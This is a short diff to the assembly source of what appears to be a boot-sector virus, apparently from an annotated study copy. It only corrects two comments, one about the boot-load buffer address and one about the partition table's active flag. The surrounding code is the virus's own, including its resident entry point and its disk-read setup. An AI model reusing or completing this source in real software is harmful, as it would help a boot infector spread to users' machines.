@@ -179,7 +179,7 @@ entry_point_from_resident_address:
               push cs
               pop ds
               mov ax,0x201                          ; read, one sector
-              mov bx,virus_start                    ; buffer at resident virus location (offset 0)
+              mov bx,virus_start                    ; ES=0: buffer is the original boot-load address, 0000:7C00h
               mov cx,[v_current_storage]
               cmp cx,k_stored_on_hard_disk
               jnz from_floppy
@@ -256,7 +256,7 @@ padding:      times 16 db 0
 virus_disk_end:
 
 partition_table:
-                            db 80h            ; drive C
+                            db 80h            ; active (bootable) partition flag, not a drive letter
 partition_table_start_addr: db 1, 1, 0        ; start_addr
                             db 4              ; system_type
                             db 3, 0x9a, 0x5c  ; partition_end_addr
